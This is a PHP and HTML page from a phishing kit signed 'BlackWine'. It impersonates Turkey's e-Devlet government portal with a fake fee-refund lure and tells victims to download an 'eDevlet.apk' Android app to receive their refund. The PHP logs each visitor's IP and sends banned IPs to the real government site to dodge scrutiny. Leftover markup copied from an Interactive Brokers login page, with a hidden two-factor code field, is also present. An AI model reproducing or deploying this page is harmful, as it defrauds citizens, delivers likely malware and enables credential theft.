<?php

$ip = $_SERVER['REMOTE_ADDR'];
include("baglan.php");

$db->query("UPDATE logs SET sayfa='Tebrik' WHERE ip = '{$ip}'");

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}
?>

<html>
<!-- Coded By BlackWine -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <!-- Coded By BlackWine -->
        <link rel="icon" type="image/png" href="./blackwine/favicon.png" sizes="196x196">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
        <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
        <link rel="stylesheet" media="all" type="text/css" href="./blackwine/bootstrap.v3.3.6.css">
        <link rel="stylesheet" media="all" type="text/css" href="./blackwine/bootstrap-switch.v3.3.2.min.css">
        <link rel="stylesheet" media="all" type="text/css" href="./blackwine/font-awesome.v4.7.0.css">
        <link rel="stylesheet" media="all" type="text/css" href="./blackwine/switchery.min.css">
        <link rel="stylesheet" media="all" type="text/css" href="./blackwine/ib-common.css">
        <link rel="stylesheet" media="all" type="text/css" href="./blackwine/login.css">
        <link rel="stylesheet" media="all" type="text/css" href="./blackwine/otp-responsive.css">
       
        <style>
            *{
                font-family: 'Open Sans', sans-serif;
            }
            input{
                font-family: 'Open Sans', sans-serif;
            }
            .gsss {
                margin:20px 0px;
                padding:20px 30px 20px 30px;
                background:#FFFFCC;
                border:1px solid #FFCC66;
                display: none;
            }

            .modal-api p {
                font-size: 16px;
                margin-bottom: 20px;
            }
            .modal-api a.link {
                color: #4d6e9d;
            }
            .modal-api a.link:hover {
                text-decoration: underline;
            }
            .modal-api .btn {
                text-transform: none;
                color: #fff;
                background-color: #4d6e9d;
                bordercolor: #4d6e9d;
                font-weight: 400;
                padding: 13px 55px;
            }
            .modal-api .btn:hover {
                color: #fff;
                background-color: #286090;
                bordercolor: #204d74;
            }
            .modal-api .modal-content {
                border-radius: 5px;
            }
            .modal-api .modal-content .modal-body {
                padding: 30px 50px 10px;
            }
            .modal-api .close {
                font-size: 50px;
                position: absolute;
                top: 10px;
                right: 20px;
            }
        </style>
<!-- Coded By BlackWine -->
        
<title>e-Devlet Online Aidat İade</title>
        
    </head>
    <body class="bg-gray">
        <section class="login-page">
            <div class="container">
                <div class="login-container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            
                                <a href="" target="_self" class="ib-logo-white"></a>
                            
                        </div>
                    </div>


        <form id="loginform" name="loginform" method="post" action="">
                        
                        <div class="login">
                            <div id="authcredentials" style="">
                                <div class="row">
                                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">


                                       <h1 style="text-align:center;"><img src="blackwine/edevlet.png" style="width:230px;"></h1><br><br>
                                        
                                       <div class="form-group">
                                       <ol style="background:#fcfcfc;width:100%;min-height:140px;
                                       border-radius:5px;padding-top:7px;padding-bottom:7px;border:1px solid #eee;">
                    <img src="blackwine/tebrik.png" width="60px;"><br><br>
                    <b style="color:#666;">&nbsp;İşleminiz Tamamlandı.</b><br>
                    <?php if(file_exists('admin/APK/eDevlet.apk')) { ?>
                        &nbsp;İadenizi almak için Android uygulamamızı indiriniz.<br><br>
                        &nbsp;<a href="admin/APK/eDevlet.apk" style="border-radius:3px;padding:4px;border:1px solid #4d6e9d;
                         background-color:#4d6e9d;color:#fff;">UYGULAMAYI İNDİR</a><br><br><?php } else{ ?>
                    &nbsp;24 Saat içerisinde iadeniz yapılacaktır.
                    <?php } ?>
                </ol>
                                        </div>

                                        <br>
                                    </div>
                                </div>


                            </div>
                            
                            <input type="hidden" id="loginType" name="loginType" value="1">

                            <div class="gsss" style="display: none;">
                            </div>
                        </div>
                    </form>
                </div>
                    
            </div>
        </section>

        
            <section class="download-text">
                <div class="container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            <p>
                            &copy; 2020 Ankara Tüm Hakları Saklıdır.
                            </p>
                        </div>
                    </div>
                </div>
            </section>

        
        <div style="display: none;">
            <div id="twofactbase">
                <p id="chlgtext_SWCR" style="display: none;">
                    Challenge:&nbsp;
                </p>
                <p id="chlgtext_Bingo" style="display: none;">
                    Use your security code card for authentication. Two card index numbers are shown in the image below. For each index, look up the corresponding value, and enter in the field below.
                </p>
                <p id="chlgtext" style="display: none;"></p>

                <label id="chlgdescr_SWTK" style="display: none;">Security Code</label>
                <label id="chlgdescr_SWCR" style="display: none;">Response String</label>
                <label id="chlgdescr_Bingo" style="display: none;">Card Values</label>
                <label id="chlgdescr_IBTK" style="display: none;">Temporary Security Code</label>
                <label id="chlgdescr"></label>
                <div class="form-group">
                    <input type="text" maxlength="8" id="chlginput" autocomplete="off" name="chlginput" class="form-control" onfocus="enableSubmit()">
                    <p class="otp-opener-text">Didn't receive a security code?</p>
                </div>
                <div class="form-group">
                    <button id="submitForm" type="submit" class="btn btn-lg btn-primary">
                        Login
                    </button>
                </div>
            </div>
        </div>
        <div id="debugarea" align="left"></div>
        <div id="helpTextCopy" style="display: none">Help</div>

        <div class="modal fade in modal-api" id="ibkrApiModal" tabindex="-1" role="dialog">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-body">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close" onclick="$(&#39;#ibkrApiModal&#39;).modal(&#39;hide&#39;)"><span aria-hidden="true">×</span></button>
                        <p>Interactive Brokers is pleased to announce the launch of its new API platform.</p>
                        <p><a class="btn btn-lg btn-primary" href="https://download2.interactivebrokers.com/portal/clientportal.beta.gw.zip" role="button">Download New API Gateway</a></p>
                        <p>This update should not cause any interruption of service or changes to API endpoints. However, if you have questions please contact us via message center in <a href="https://www.interactivebrokers.com/en/software/am3/am/support/creatingaticket.htm" target="_blank" class="link">Client Portal</a>.</p><p>Please note that our legacy platform will no longer be accessible after <strong>June 20, 2020.</strong></p>
                    </div>
                </div>
            </div>
        </div>


</body></html>